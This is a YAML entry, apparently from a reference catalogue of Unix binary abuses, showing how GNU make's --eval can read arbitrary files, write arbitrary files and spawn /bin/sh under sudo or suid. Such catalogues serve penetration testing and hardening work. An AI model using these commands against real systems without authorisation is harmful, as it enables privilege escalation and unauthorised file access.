---
functions:
  file-read:
  - binary: false
    code: |-
      make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
    contexts:
      sudo:
      suid:
      unprivileged:
    version: |-
      GNU
  file-write:
  - code: |-
      make -s --eval='$(file >/path/to/output-file,DATA)' .
    contexts:
      sudo:
      suid:
      unprivileged:
    version: |-
      GNU
  shell:
  - code: |-
      make --eval='$(shell /bin/sh 1>&0)' .
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
    version: |-
      GNU
...
